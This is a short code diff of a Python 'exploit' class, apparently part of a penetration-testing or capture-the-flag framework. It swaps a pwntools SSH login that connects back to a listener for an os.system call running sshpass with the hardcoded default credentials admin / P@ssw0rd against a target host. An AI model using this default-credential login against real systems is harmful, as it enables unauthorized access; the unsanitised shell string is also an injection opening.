@@ -1,4 +1,4 @@
-import pwn, Util
+import Util,os 
 
 class exploit(object):
     def __init__(self):
@@ -15,14 +15,8 @@ class exploit(object):
 
 
     def exploit(self):
-        l = listen()
         for _ in range(3):
-            try: 
-                s = pwn.ssh(host=self.HOST, user='admin', password='P@ssw0rd')
-                s.connect_remote(s.host, l.lport)
-            except:
-                pass
-
+            os.system(f"sshpass -p P@ssw0rd ssh admin@{self.HOST}")
 
     def _validate(self):
         if(self.HOST == None):
